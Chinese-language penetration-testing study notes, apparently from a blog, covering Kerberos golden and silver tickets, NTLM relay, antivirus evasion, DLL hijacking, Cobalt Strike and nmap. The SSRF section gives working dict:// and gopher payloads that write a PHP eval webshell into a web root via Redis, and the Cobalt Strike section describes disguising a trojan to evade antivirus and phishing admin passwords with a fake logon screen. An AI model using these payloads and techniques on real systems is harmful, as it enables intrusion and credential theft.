<h2 id="金银票据-1"><a href="#金银票据-1" class="headerlink" title="金银票据"></a>金银票据</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/ZhaoSong_/article/details/133800244">https://blog.csdn.net/ZhaoSong_/article/details/133800244</a></p>
<p>TGT（票据授权票）：无法对任何服务进行访问，但是TGT可以认证用户的身份。（身份票据）</p>
<p>TGT有权限去申请其他服务的票据。获取到其他服务的票据后如邮件服务的票据，就可以访问邮件服务了。</p>
<p>说明：</p>
<ul>
<li>黄金票据（TGT）就是身份票据</li>
<li>白银票据（SGT）就是服务票据</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=PTH&spm=1001.2101.3001.7020">PTH</a>哈希传递</p>
<p>PTT票据传递（黄金票据与白银票据）</p>
<p>1、个人文件还是公司文件以及服务都存在于一台系统上，所有人都要去一台机器办公，效率非常低，为每个人分配了电脑以后就需要考虑安全问题</p>
<p>2、如何让服务器正确识别每一个人，假定所有数据包在传输过程中都可以被任意截取和修改</p>
<p>3、在每一台电脑上都存入所有人的账户密码是不现实的，所以引入一个认证服务统一管理所有的用户密码</p>
<p>4、假设用户访问邮件服务，认证服务让你提供密码以此来证明身份，它把你提供的密码和数据库中的密码相比较，通过认证，认证服务不会提供给你任何密码，不然下次你就可以不认证直接利用密码登录，认证服务会给你一张票，拿到票后，你把此票给邮件服务，以此来证明你的身份</p>
<p>5、需要解决的问题，每次使用还没有得到票的服务前，都必须给认证密码。比如使用邮件服务，就要输入一次。使用文件服务，又要输入一次。打印服务，还要输入一次，并且网络中明文传输密码。不法分子就可以监听网络流量获取密码。</p>
<p>6、引入”票据授权”服务(TGS)，TGS将代替认证服务的发票功能，以后认证服务不在提供票据，如果你有TGS发放的服务票证，可以使用此票对应的服务</p>
<p>7、如果你通过了认证服务的验证，将会得到一张票据授权票(TGT)，现在你想使用邮件服务，然而还没有邮件服务的票，所以你使用”票据授权”票去取邮件服务的票，”票据授权”票，可以使用此票获取你需要的其他服务票</p>
<p>8、解决密码明文传输，当你取得票据授权票时，不再发送密码，而只发送你的用户名，认证服务得到用户名以后用此用户名查你的密码，之后认证服务会制作一个包含票据授权票(TGT)的数据包，并且用你的密码加密此数据包，这样即使数据包被截取没有密码无法解密也获取不到TGT</p>
<p>9、票据的有效期问题，有效期内票据丢失会产生复用，并且没法灵活销毁票据</p>
<p>10、引入会话密钥session key ，认证服务，认证服务会返回票以及一份session key，都用用户的ntml加密，用户利用session key生成认证器来与服务进行沟通</p>
<h4 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h4><p>1、KDC 服务默认会安装在一个域的域控中</p>
<p>Kerberos协议对于用户的认证上在域控中有的服务名称是：KDC。KDC包含了AS服务和TGS服务。</p>
<p>（Authentication Service）AS服务下发身份票据TGT也就是黄金票据</p>
<p>（Ticket Granting Service）TGS服务下发服务票据SGT也就是白银票据</p>
<p>2、从物理层面看，AD与KDC均为域控制器(Domain Controller)</p>
<p>3、AD其实是一个类似于本机SAM的一个数据库，全称叫account database，存储所有client的白名单，只有存在于白名单的client才能顺利申请到TGT</p>
<p>4、KDC 服务框架中包含一个 KRBTGT 账户，它是在创建域时系统自动创建的一个账号，你可以暂时理解为他就是一个无法登陆的账号，在发放票据时会使用到它的密码 HASH 值。</p>
<p>KRBTGT hash可以理解为域管理员的哈希值，域控才有KRBTGT hash</p>
<h3 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h3><p>黄金票据就是伪造的TGT，AS返回的票据</p>
<p>3.1 条件<br>1、域名称</p>
<p>2、域的SID值</p>
<p>3、域的KRBTGT账号的HASH</p>
<p>4、伪造任意用户名</p>
<p>3.2 适用场景<br>由于有些原因导致你对域管权限丢失，但好在你还有一个普通域用户权限，管理员在域内加固时忘记重置krbtgt密码</p>
<h3 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h3><p>白银票据就是伪造的ST，TGS返回的票据</p>
<h4 id="4-1-条件"><a href="#4-1-条件" class="headerlink" title="4.1 条件"></a>4.1 条件</h4><p>1.域名</p>
<p>2.域sid</p>
<p>3.目标服务器名</p>
<p>4.可利用的服务</p>
<p>5.服务账号的NTML HASH</p>
<p>6.需要伪造的用户名</p>
<h4 id="4-2-适用场景"><a href="#4-2-适用场景" class="headerlink" title="4.2 适用场景"></a>4.2 适用场景</h4><p>知道服务器的Hash，可以访问服务器的某些服务而不用于kdc进行交互</p>
<h3 id="区别-2"><a href="#区别-2" class="headerlink" title="区别"></a>区别</h3><p>5.1 获取的权限不同<br>金票：伪造的TGT，可以获取任意Kerberos的访问权限。</p>
<p>银票：伪造的ST，只能访问指定的服务，如文件服务器（CIFS）。</p>
<p>5.2 认证流程不同<br>金票：同KDC交互，但不同AS交互。</p>
<p>银票：不同KDC交互，直接访问Server。</p>
<p>5.3 加密方式不同<br>金票：由krbtgt NTLM Hash 加密。</p>
<p>银票：由服务账号 NTLM Hash 加密。</p>
<ol start="6">
<li>经典面试题<br>6.1 什么是黄金票据与白银票据？<br>黄金票据就是伪造了Kerberos协议中的身份票据（TGT）</li>
</ol>
<p>黄金票据可以访问该用户身份的所有服务<br>白银票据就是伪造了Kerberos协议通信流程中服务票据（SGT）</p>
<p>白银票据只能访问某一个服务<br>使用域管理员身份创建的票据就是黄金票据，可以访问域内的所有服务。</p>
<p>6.2 kerberos认证流程？<br>客户端先去找AS服务进行认证，获取身份票据TGT。</p>
<p>然后拿着TGT票据寻找TGS服务，获取服务票据。</p>
<h2 id="木马免杀"><a href="#木马免杀" class="headerlink" title="木马免杀"></a>木马免杀</h2><p>代码混淆：通过修改恶意代码的结构而不改变其功能，来避免特征码匹配。这包括变量名、函数调用和控制流的改变。</p>
<p>加密或压缩：将恶意代码加密或压缩，使其在静态分析时不显示任何恶意特征。加密的代码在执行前需要解密，因此攻击者通常会在载荷中包含解密器。</p>
<p>使用合法的程序载体：将恶意代码注入到正常的、受信任的程序或文件中。这种方法使恶意软件看起来像是合法的应用程序。</p>
<p>利用未知漏洞（0day）：利用安全软件尚未知晓的漏洞，因为没有现成的特征码或行为特征可供检测。</p>
<p>环境感知：恶意软件在执行之前检查是否在分析环境（如虚拟机或沙箱）中运行。如果检测到分析工具，它可能不执行恶意操作。</p>
<p>多阶段加载：分阶段加载恶意软件，每一步只执行部分恶意活动，以避免完整恶意功能的同时触发。</p>
<p>修改或禁用安全软件：直接攻击或修改系统上的安全软件，禁用它们的保护功能。</p>
<p>签名欺骗：使用伪造或盗用的数字签名来使恶意软件看起来像是由可信实体发布的。</p>
<h2 id="什么是shellcode-loader"><a href="#什么是shellcode-loader" class="headerlink" title="什么是shellcode loader"></a>什么是shellcode loader</h2><p>顾名思义，Loader就是加载器的意思，写好的shellcode是需要用加载器（Loader）来运行的。且同一个shellcode可以用不同的Loader来运行。常见的Loader运行方式如：内联汇编加载、函数指针加载、创建线程加载等，shell使用的Loader不同，其免杀能力也会有所不同。</p>
<h2 id="NTLM-relay攻击"><a href="#NTLM-relay攻击" class="headerlink" title="NTLM relay攻击"></a>NTLM relay攻击</h2><h3 id="ntlm认证过程"><a href="#ntlm认证过程" class="headerlink" title="ntlm认证过程"></a>ntlm认证过程</h3><p>非域中</p>
<p>当客户端需要访问服务器时，客户端需要输入服务器的用户名和密码进行验证，并且客户端会将服务器的<strong>NTLM-Hash</strong>值缓存。之后客户端开始向服务器发送 TYPE 1 Negotiate 协商消息。<br>服务器收到客户端发送来的 TYPE 1 协商消息后，会取出其中自己能够接受的内容，传入NTLM SSP，得到 TYPE 2 挑战消息，此 TYPE 2消息中包含了一个由服务端生成的16位随机值，被称为 Challenge。服务器将此challenge保存一份后将TYPE 2消息发送回客户端。<br>客户端收到服务器发来的TYPE 2消息后，读出其中的challenge值，用缓存的服务端密码的NTLM-Hash对其进行加密，并与用户名、challenge等一起组合得到 Net-NTLMHash ，最后将 Net-NTLMHash 封装到 TYPE 3 NTLM_AUTH消息中发往服务器。<br>服务器在收到 TYPE 3 的消息之后，用自己密码的 NTLM-Hash 对 Challenge 进行加密，并比较自己计算出的 Net NTLM-Hash 认证消息和客户端发送的认证消息是否匹配。如果匹配，则证明客户端掌握了正确的密码，认证成功，否则认证失败。<br>域中，在第4步有所不同，如果是在域环境中，那么认证过程会经过域控制器：</p>
<p>当客户端需要访问服务器时，客户端需要输入服务器的用户名和密码进行验证，并且客户端会将服务器的NTLM-Hash值缓存。之后客户端开始向服务器发送 TYPE 1 Negotiate 协商消息。<br>服务器收到客户端发送来的 TYPE 1 协商消息后，会取出其中自己能够接受的内容，传入NTLM SSP，得到 TYPE 2 挑战消息，此 TYPE 2消息中包含了一个由服务端生成的16位随机值，被称为 Challenge。服务器将此challenge保存一份后将TYPE 2消息发送回客户端。<br>客户端收到服务器发来的TYPE 2消息后，读出其中的challenge值，用缓存的服务端密码的NTLM-Hash对其进行加密，并与用户名、challenge等一起组合得到 <strong>Net-NTLMHash</strong> ，最后将 Net-NTLMHash 封装到 TYPE 3 NTLM_AUTH消息中发往服务器。<br>服务器接收到客户端发送来的 TYPE 3 消息后，取出其中的Net NTLM-Hash值，并向域控制器发送针对客户端的验证请求。该请求的内容包含：用户名、原始的 Challenge 和 加密后的Challenge(也就是Net NTLM-Hash)。<br>DC根据用户名取出该帐号的密码哈希值 NTLM-Hash，用密码哈希值 NTLM-Hash 对原始的Challenge进行加密得到Net NTLM-Hash。如果加密后的Challenge和服务器发送的一致，则意味着用户拥有正确的密码，验证通过，否则验证失败。DC将验证结果发给服务器。<br>针对NTLM Hash的攻击：PTH，信息收集<br>针对Net NTLM Hash的攻击：暴力破解明文密码，利用Net-NTLM Hash中继攻击<br>Pass The Hash：哈希传递攻击，通过抓取主机上的Hash，传递他们进行攻击，不需要明文密码。</p>
<p>利用NTLM进行信息收集：通过CS，命令就可以达到目的，没有意义。</p>
<p>Net-NTLM Hash破解，暴力破解得到明文密码</p>
<p>NTLM Relay：利用Net-NTLM Hash进行中继攻击</p>
<p>PTH的攻击条件需要NTLM-Hash，而后两种则是通过Net-NTLM Hash进行攻击的</p>
<p>如果计算机的修改过注册表，打过补丁，都有可能造成明文密码，Hash提取不到。我们可以尝试获得Net NTLM Hash进行攻击利用。</p>
<h3 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h3><p>这种攻击方式可以应用在获取不到明文或HASH时采用的手法，但也要注意手法的必备条件。</p>
<p>Relay攻击要涉及到NTLM认证和Net-NTLM Hash</p>
<p>NTLM Hash：NTLM hash 就是里面加密保存了用户密码的 hash。Windows 中的用户密码被系统加密后保存在 SAM 文件中，如果是域环境则保存在域控的 NTDS.dit 中。</p>
<p>Net NTLM Hash：Net-NTLM Hash 是基于用户密码的NTLM Hash计算出来的，用于在网络环境下 NTLM 认证的 hash。客户端在请求服务时需要的NTLM Hash是服务端密码，Net NTLM Hash的生成需要服务端密码的NTLM Hash和challenge，用户名得到的。</p>
<p>NTLM攻击总结<br>有NTLM Hash，直接PTH；没有NTLM Hash，尝试抓取Net NTLM Hash，暴力破解明文密码，中继攻击。</p>
<p>NTLM Realy 攻击其实应该称为Net-NTLM Realy 攻击，它发生在NTLM认证的第三步，在Response 消息中存在Net-NTLM<br>Hash,当攻击者获得了 Net-NTLM Hash 后，可以重放Net-NTLM Hash 进行<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB&spm=1001.2101.3001.7020">中间人攻击</a>。</p>
<h3 id="对应版本"><a href="#对应版本" class="headerlink" title="对应版本"></a>对应版本</h3><p>已知<em>ntlm</em>分为v1&amp;v2的<em>版本</em>,其中v1的response非常容易能够爆破出用户hash,相比较而言不安全,但ntlmv2的版本使用了hmac_md5函数,通过response很难爆破出真正的用户..</p>
<h2 id="dll注入和劫持"><a href="#dll注入和劫持" class="headerlink" title="dll注入和劫持"></a>dll注入和劫持</h2><p>DLL注入技术，一般来讲是向一个正在运行的进程插入&#x2F;注入代码的过程。我们注入的代码以动态链接库（DLL）的形式存在。DLL文件在运行时将按需加载（类似于UNIX系统中的共享库(share object，扩展名为.so)）。然而实际上，我们可以以其他的多种形式注入代码（正如恶意软件中所常见的，任意PE文件，shellcode代码&#x2F;程序集等）。</p>
<p>如果在一个进程加载dll时没有指定dll的绝对路径，那么windows会尝试去按照顺序搜索这些特定目录来查找这个dll。如果攻击者将恶意的dll放在优先于正常dll所在目录，那么就能够欺骗系统去加载恶意的dll,形成dll劫持。</p>
<h2 id="PTT的三种方式"><a href="#PTT的三种方式" class="headerlink" title="PTT的三种方式"></a>PTT的三种方式</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qi_SJQ_/article/details/122849550">https://blog.csdn.net/qi_SJQ_/article/details/122849550</a></p>
<p>PTT 攻击的部分就不是简单的 NTLM 认证了，它是利用 Kerberos 协议 进行攻击的，这里就介绍三种 常见的攻击方法：MS14-068，Golden ticket，SILVER ticket，简单来说就是将连接合法的票据注入到 内存中实现连接。利用的票据凭证 TGT 进行的渗透测试</p>
<p>MS14-068 基于漏洞，Golden ticket(黄金票据)，SILVER ticket(白银票据)；</p>
<p>其中 Golden ticket(黄金票据)、SILVER ticket(白银票据)属于权限维持技术，MS14-068的危害是造成允许域内任何一个普通用户，将自己提升至域管权限。微软给出的补丁是 kb3011780。</p>
<p>一张图简单明了：</p>
<p><img src="/photo/image-20240616101627189.png" alt="image-20240616101627189"></p>
<p>1）PTH：</p>
<p>PTH 在内网渗透中是一种很经典的攻击方式，原理就是攻击者可以直接通过 LM Hash 和 NTLM Hash 访问远程主机或服务，而不用提供明文密码。</p>
<p>如果禁用了 ntlm 认证，PsExec 无法利用获得的 ntlm hash 进行远程连接，但是使用 mimikatz 还是可<br>以攻击成功。对于 8.1&#x2F;win2012 r2，安装补丁 kb2871997 的 Win 7&#x2F;2008r2&#x2F;8&#x2F;2012 等，可以使用 AES keys 代替 NT hash 来实现 ptk 攻击。</p>
<p>打没打 KB2871997 补丁后的影响（查看补丁就是看信息收集的systeminfo）：</p>
<p>PTH：没打补丁用户都可以连接，打了补丁只能 administrator 连接。<br>PTK：打了补丁才能r用户都可以连接，采用 aes256 连接。</p>
<h2 id="文件上传条件竞争"><a href="#文件上传条件竞争" class="headerlink" title="文件上传条件竞争"></a>文件上传条件竞争</h2><p>在上传文件源代码里面有校验上传的文件，文件直接上传，上传成功后才进行判断；如果文件格式符合的情况下，则重命名，如果文件格式不符合要求，就将文件删除。<br>由于服务器并发处（同时）理多个请求，假如a用户上传了一个文件，b用户访问a用户的文件就会出现以下三种情况：<br>1.访问时间点在上传文件之前，没有此文件<br>2.访问时间在上传文件之后，且服务器还未将其删除，文件存在<br>3.访问时间点在服务器删除文件之后，文件不存在<br>我们利用的就是第二个情况，下面我们就复现一下吧</p>
<p>通过burp的intruder来发送，但是地址和文件名必须知道</p>
<h2 id="ssrf如何写马"><a href="#ssrf如何写马" class="headerlink" title="ssrf如何写马"></a>ssrf如何写马</h2><p>实战ssrf +redis写入wedshell</p>
<p>条件：</p>
<ol>
<li>要知道网站的绝对路径</li>
<li>redis有目录的写入权限</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">dict协议利用redis相关漏洞：</span><br><span class="line"></span><br><span class="line">探测端口：</span><br><span class="line"></span><br><span class="line">ssrf.php?url=dict://x.x.x.x:$端口$ 利用burpsuite爆破端口</span><br><span class="line"></span><br><span class="line">探测是否设置弱口令：</span><br><span class="line"></span><br><span class="line">ssrf.php?url=dict://x.x.x.x:6379/info 已知端口利用info探测是否设置了密码</span><br><span class="line"></span><br><span class="line">爆破密码：</span><br><span class="line"></span><br><span class="line">ssrf.php?url=dict://x.x.x.x:6379/auth:$密码$ 利用burpsuite爆破密码</span><br><span class="line"></span><br><span class="line">写入webshell：</span><br><span class="line"></span><br><span class="line">url=dict://http://xxx.xxx:6379/config:set:dir:/var/www/html 切换文件目录</span><br><span class="line"></span><br><span class="line">url=dict://http://xxx.xxx:6379/config:set:dbfilename:webshell.php 设置保存文件名</span><br><span class="line"></span><br><span class="line">url=dict://http://xxx.xxx:6379/set:webshell:&quot; \x3f\x70\x68\x70\x20\x70\x68\x70\x69\x6e\x66\x6f\x28\x29\x3b\x3f\x3e&quot; //利用dict协议写入webshell 以上的字符编码是&lt;?php phpinfo();?&gt;的十六进制</span><br><span class="line"></span><br><span class="line">url=dict://x.x.x.x:6379/save 保存</span><br><span class="line"></span><br><span class="line">url=dict://http://xxx.xxx:6379/config:set:dir:/var/www/html 切换文件目录</span><br><span class="line"></span><br><span class="line">url=dict://http://xxx.xxx:6379/config:set:dbfilename:webshell.php 设置保存文件名</span><br><span class="line"></span><br><span class="line">url=dict://http://xxx.xxx:6379/set:webshell:&quot; \x3f\x70\x68\x70\x20\x70\x68\x70\x69\x6e\x66\x6f\x28\x29\x3b\x3f\x3e&quot;</span><br><span class="line"></span><br><span class="line">//利用dict协议写入webshell 以上的字符编码是&lt;?php phpinfo();?&gt;的十六进制</span><br><span class="line"></span><br><span class="line">4.ssrf.php?url=dict://x.x.x.x:6379/save 保存</span><br><span class="line"></span><br><span class="line">dict协议利用计划任务反弹shell或者写入ssh公钥的手段类似</span><br><span class="line"></span><br><span class="line">gopher协议利用redis未授权访问漏洞写入webshell：</span><br><span class="line"></span><br><span class="line">常规利用步骤：</span><br><span class="line"></span><br><span class="line">set x &quot;\n\n\n&lt;?php @eval($_POST[&#x27;redis&#x27;]);?&gt;\n\n\n&quot; config set dir /var/www/html config set dbfilename shell.php save</span><br><span class="line"></span><br><span class="line">//第一次url解码和第二次url解码</span><br><span class="line"></span><br><span class="line">//同理其他类似计划任务反弹和写入ssh公钥等getshell方式相似</span><br></pre></td></tr></table></figure>

<p>通过gopher或者dict协议来攻击</p>
<p><img src="/photo/image-20240627161609990.png" alt="image-20240627161609990"></p>
<p><img src="/photo/image-20240627161621277.png" alt="image-20240627161621277"></p>
<p><img src="/photo/image-20240627161632369.png" alt="image-20240627161632369"></p>
<p>redis未授权攻击</p>
<p><img src="/photo/image-20240627161732424.png" alt="image-20240627161732424"></p>
<p><a target="_blank" rel="noopener" href="https://blog.51cto.com/u_12364708/3029681">https://blog.51cto.com/u_12364708/3029681</a></p>
<h2 id="CS的使用"><a href="#CS的使用" class="headerlink" title="CS的使用"></a>CS的使用</h2><p>先开启服务端，然后登录客户端，之后创建监听器，然后生成木马</p>
<ol>
<li>修改特征码</li>
<li>花指令免杀</li>
<li>加壳免杀</li>
<li>内存免杀</li>
<li>二次编译</li>
<li>分离免杀</li>
<li>资源修改</li>
</ol>
<p>如加壳和资源修改</p>
<p>首先打开应用Restorator，拖进木马和网易云，把网易云所有资源信息都复制到木马上，点击保存即可。</p>
<p><img src="/photo/image-20240626135029488.png" alt="image-20240626135029488"></p>
<p><img src="/photo/image-20240626135057573.png" alt="image-20240626135057573"></p>
<p>成功bypass</p>
<h3 id="Cobalt-strike-向-Msf传递会话"><a href="#Cobalt-strike-向-Msf传递会话" class="headerlink" title="Cobalt strike 向 Msf传递会话:"></a>Cobalt strike 向 Msf传递会话:</h3><p>当我们获得一个CS木马会话时，那么该怎么传递到msf呢？</p>
<p>其实也挺简单的，再配置一个监听器，设置模块为Foreign HTTP。</p>
<p><img src="/photo/image-20240626135156094.png" alt="image-20240626135156094"></p>
<p><img src="/photo/image-20240626135232054.png" alt="image-20240626135232054"></p>
<h3 id="Msf派生shell给Cobaltstrike："><a href="#Msf派生shell给Cobaltstrike：" class="headerlink" title="Msf派生shell给Cobaltstrike："></a>Msf派生shell给Cobaltstrike：</h3><p>这里还是新建一个监听器，设置模块为beacon HTTP</p>
<p><img src="/photo/image-20240626135308162.png" alt="image-20240626135308162"></p>
<p><img src="/photo/image-20240626135323438.png" alt="image-20240626135323438"></p>
<p><img src="/photo/image-20240626135331606.png" alt="image-20240626135331606"></p>
<h3 id="Cobaltstrike提权"><a href="#Cobaltstrike提权" class="headerlink" title="Cobaltstrike提权"></a>Cobaltstrike提权</h3><p>当我们拿到会话时，首先应该输入sleep 1来修改响应时间，</p>
<p>因为cs默认执行命令响应为60&#x2F;s，这样子太慢了。</p>
<p>影响实验效率</p>
<p><img src="/photo/image-20240626135414930.png" alt="image-20240626135414930"></p>
<p><img src="/photo/image-20240626135434862.png" alt="image-20240626135434862"></p>
<h3 id="Cobaltstrike伪造Windows登录界面"><a href="#Cobaltstrike伪造Windows登录界面" class="headerlink" title="Cobaltstrike伪造Windows登录界面"></a>Cobaltstrike伪造Windows登录界面</h3><p>有时候获取到会话时，因为目标系统版本过高，无法直接使用猕猴桃读取密码，还得去修改注册表，这就很麻烦。</p>
<p>这时候我们就可以用c语言写一个钓鱼的系统登录页面来窃取密码，在beacon输入命令execute-assembly FakeLogonScreen.exe即可</p>
<p><img src="/photo/v2-2b9868b53c1c8cc4b9e6b9c689a3b7ce_720w.webp" alt="img"></p>
<p>此时目标服务器弹出了登录页面，目标管理员一看到应该也没有什么怀疑，直接就输入密码。</p>
<p>这时候我们的cs客户端可以看到管理员输入的内容了。</p>
<h3 id="获取浏览器储存的密码"><a href="#获取浏览器储存的密码" class="headerlink" title="获取浏览器储存的密码"></a>获取浏览器储存的密码</h3><p>很多人为了操作方便，习惯性的将密码储存在浏览器中。</p>
<p>这使得攻击者可以利用人懒得特性，来进行获取存储在浏览器里的密码。</p>
<p><img src="/photo/v2-0edab75c13a7c7ed5f4999be280a8f20_720w.webp" alt="img"></p>
<h3 id="Cobaltstrike代理"><a href="#Cobaltstrike代理" class="headerlink" title="Cobaltstrike代理"></a>Cobaltstrike代理</h3><p>会话右键-》中转-》SOCKS Server 开启 socks4 代理，选择想要的端口，打开 proxifier输入我们刚刚选择的端口即可，对内网做更多操作。</p>
<p><img src="/photo/v2-96678e27aad8f29deadc1c9b12797c34_720w.webp" alt="img"></p>
<p><img src="/photo/v2-fbbd65343f72b3ddc6ebcb2d2d2a8b1c_720w.webp" alt="img"></p>
<h2 id="nmap参数"><a href="#nmap参数" class="headerlink" title="nmap参数"></a>nmap参数</h2><p><img src="/photo/1934683e7df678289122826199074fa8.jpeg" alt="img"></p>
<p>主机发现</p>
<p>iR 随机选择目标</p>
<p>-iL 从文件中加载IP地址</p>
<p>-sL 简单的扫描目标</p>
<p>-sn Ping扫描-禁用端口扫描</p>
<p>-Pn 将所有主机视为在在线，跳过主机发现</p>
<p>-PS[portlist] （TCP SYN ping） 需要root权限</p>
<p>-PA[portlist] （TCP ACK ping）</p>
<p>-PU[portlist] （UDP ping）</p>
<p>-PY [portlist] （SCTP ping）</p>
<p>-PE&#x2F;PP&#x2F;PM ICMP回显，时间戳和网络掩码请求探测</p>
<p>-PO[协议列表] IP协议Ping</p>
<p>-n&#x2F;-R 从不执行DNS解析&#x2F;始终解析[默认：有时]</p>
<p>–dns-servers 指定自定义DNS服务器</p>
<p>–system-dns 使用OS的dns服务器</p>
<p>–traceroute 跟踪到每个主机的跃点路径</p>
<p>扫描技术</p>
<p>-sS 使用TCP的SYN进行扫描</p>
<p>-sT 使用TCP进行扫描</p>
<p>-sA 使用TCP的ACK进行扫描</p>
<p>-sU UDP扫描</p>
<p>-sI Idle扫描</p>
<p>-sF FIN扫描</p>
<p>-b&lt;FTP中继主机&gt; FTP反弹扫描</p>
<p>端口规格和扫描顺序</p>
<p>-p 扫描指定端口</p>
<p>–exclude-ports 从扫描中排除指定端口</p>
<p>-f 快速模式-扫描比默认扫描更少的端口</p>
<p>-r 连续扫描端口-不随机化</p>
<p>–top-ports 扫描最常用的端口</p>
<p>服务&#x2F;版本探测</p>
<p>-sV 探测服务&#x2F;版本信息</p>
<p>–version-intensity 设置版本扫描强度（0-9）</p>
<p>–version-all 尝试每个强度探测</p>
<p>–version-trace 显示详细的版本扫描活动（用于调试）</p>
<p>脚本扫描</p>
<p>-SC 等效于 –script&#x3D;defult</p>
<p>–script &#x3D; , 以逗号分隔的目录，脚本文件或脚本类别</p>
<p>–script-args &#x3D; &lt;n1&#x3D;v1, n2&#x3D;v2&gt; 为脚本提供参数</p>
<p>–script-args-file&#x3D;文件名 从文件名中加载脚本参数</p>
<p>–script-trace 显示发送和接受的所有数据</p>
<p>–script-updatedb 更新脚本数据库</p>
<p>–script-help&#x3D; 显示有关脚本的帮助</p>
<p>操作系统检测</p>
<p>-o 启用os检测</p>
<p>–osscan-limit 将os检测限制为可能的目标</p>
<p>–osscan-guess 推测操作系统检测结果</p>
<p>时间和性能</p>
<p>–host-timeout 设置超时时间</p>
<p>–scan-delay 设置探测之间的时间间隔</p>
<p>-T &lt;0-5&gt; 设置时间模板,值越小，IDS报警几率越低</p>
<p>防火墙&#x2F;IDS规避和欺骗</p>
<p>-f 报文分段</p>
<p>-s 欺骗源地址</p>
<p>-g 使用指定的本机端口</p>
<p>–proxies &lt;url,port&gt; 使用HTTP&#x2F;SOCK4代理</p>
<p>-data 想发送的数据包中追加自定义的负载</p>
<p>–data-string 将自定义的ACSII字符串附加到发送数据包中</p>
<p>–data-length 发送数据包时，附加随机数据</p>
<p>–spoof-mac MAC地址欺骗</p>
<p>–badsum 发送带有虚假TCP&#x2F;UNP&#x2F;STCP校验和的数据包</p>
<p>输出</p>
<p>-oN 标准输出</p>
<p>-oX XMl输出</p>
<p>-oS script jlddi3</p>
<p>-oG grepable</p>
<p>-oA 同时输出三种主要格式</p>
<p>-v 信息详细级别</p>
<p>-d 调试级别</p>
<p>–packet-trace 跟踪发送和接收的报文</p>
<p>–reason 显示端口处于特殊状态的原因</p>
<p>–open 仅显示开放的端口</p>
<p>杂项</p>
<p>-6 启动Ipv6扫描</p>
<p>-A 启动Os检测，版本检测，脚本扫描和traceroute</p>
<p>-V 显示版本号</p>
<p>-h 帮助信息</p>
<h2 id="wireshark常用过滤"><a href="#wireshark常用过滤" class="headerlink" title="wireshark常用过滤"></a>wireshark常用过滤</h2><p>协议过滤器：<br>tcp：仅显示TCP协议的数据包。<br>udp：仅显示UDP协议的数据包。<br>icmp：仅显示ICMP协议的数据包。<br>http：仅显示HTTP协议的数据包。<br>dns：仅显示DNS协议的数据包。<br>IP地址和端口过滤器：<br>ip.addr &#x3D;&#x3D; 192.168.1.1：显示源或目的IP地址为192.168.1.1的数据包。<br>ip.src &#x3D;&#x3D; 192.168.1.1：仅显示源IP地址为192.168.1.1的数据包。<br>ip.dst &#x3D;&#x3D; 192.168.1.1：仅显示目的IP地址为192.168.1.1的数据包。<br>tcp.port &#x3D;&#x3D; 80：显示TCP端口为80的数据包。<br>udp.port &#x3D;&#x3D; 53：显示UDP端口为53的数据包。<br>逻辑运算符：<br>and：逻辑与，例如ip.addr &#x3D;&#x3D; 192.168.1.1 and tcp.port &#x3D;&#x3D; 80。<br>or：逻辑或，例如tcp.port &#x3D;&#x3D; 80 or tcp.port &#x3D;&#x3D; 443。<br>not：逻辑非，例如not dns。<br>表达式过滤器：<br>frame.len &gt;&#x3D; 100：显示长度大于或等于100字节的数据包。<br>tcp.flags.syn &#x3D;&#x3D; 1：仅显示设置了SYN标志的TCP数据包。<br>字符串匹配过滤器：<br>http.request.uri contains “login”：显示HTTP请求URI中包含”login”的数据包。<br>dns.qry.name &#x3D;&#x3D; “example.com”：显示DNS查询中请求的域名是”example.com”的数据包。<br>其他过滤器：<br>vlan：仅显示带有VLAN标记的数据包。<br>wlan：仅显示无线局域网（WLAN）相关的数据包。<br>arp：仅显示ARP协议的数据包。<br>使用这些过滤器时，您可以在Wireshark的过滤器栏中输入它们，然后按Enter键应用。有效的过滤器会减少显示的数据包数量，使您能够专注于分析特定类型的网络流量。记得，过滤器的语法必须正确，否则Wireshark将不会应用它。</p>
<h2 id="burp"><a href="#burp" class="headerlink" title="burp"></a>burp</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/lau_jw/article/details/134050646">https://blog.csdn.net/lau_jw/article/details/134050646</a></p>
<h2 id="隧道"><a href="#隧道" class="headerlink" title="隧道"></a>隧道</h2><p><strong>1.1 隧道技术的概念</strong></p>
<p>今天想跟大家聊一聊常用的内网代理工具和对这些工具常见的检测方法。内网代理一般使用隧道技术，援引一段百度百科对“隧道技术”的介绍：</p>
<p>隧道技术是一种通过使用互联网络的基础设施在网络之间传递数据的方式。使用隧道传递的数据(或负载)可以是不同协议的数据帧或包。隧道协议将这些其他协议的数据帧或包重新封装在新的包头中发送。新的包头提供了路由信息，从而使封装的负载数据能够通过互联网络传递。</p>
<p>被封装的数据包在隧道的两个端点之间通过公共互联网络进行路由。被封装的数据包在公共互联网络上传递时所经过的逻辑路径称为隧道。一旦到达网络终点，数据将被解包并转发到最终目的地。注意隧道技术是指包括数据封装、传输和解包在内的全过程。</p>
